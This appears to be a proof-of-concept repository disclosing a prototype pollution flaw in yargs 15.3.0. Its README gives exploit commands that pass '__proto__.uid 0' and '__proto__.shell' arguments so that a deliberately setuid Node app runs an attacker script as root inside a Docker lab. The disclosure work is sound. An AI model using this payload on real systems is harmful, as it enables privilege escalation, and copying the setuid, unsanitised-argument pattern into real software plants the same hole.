Prototype Pollution security vulnerability in yargs
#
##
##
#

README.md
Prototype Pollution security vulnerability in yargs
How to run:
npm i
npm run build
npm run start
Definition
Now you are in a sandbox with permissions of just-user. Our goal is to create test.txt at the root of a container. For sure we don't have that permissions.

To validate it let's try to do the following:

echo "test" > /test.txt
bash: /test.txt: Permission denied
Exploit
Create exploit script: printf '#!/bin/sh\necho "test" > /test.txt' > /tmp/exploit
Give it execute permission: chmod +x /tmp/exploit
Run the application: ./app --a.__proto__.uid 0 --a.__proto__.shell /tmp/exploit
To validate run cat /test.txt.

As you can see we have permission violation via vulnerable application.

app.js
const argv = require('yargs').argv;
const cp = require('child_process');
if (argv.l) {
    console.log(String(cp.execSync('ls -l')));
} else {
    console.log(String(cp.execSync('ls /')));
}
Dockerfile
FROM ubuntu:18.04

COPY ./app /app
RUN chmod u+s /app

RUN useradd -s /bin/bash just-user
USER just-user
package.json
{
  "name": "poc",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "keywords": [],
  "author": "",
  "license": "ISC",
  "scripts": {
    "start": "docker run --rm -it poc bash",
    "build": "npm run build:cli && npm run build:docker",
    "build:cli": "pkg app.js --target node10-linux-x64",
    "build:docker": "docker build . --tag poc"
  },
  "dependencies": {
    "yargs": "15.3.0"
  },
  "devDependencies": {
    "pkg": "4.4.4"
  }
}
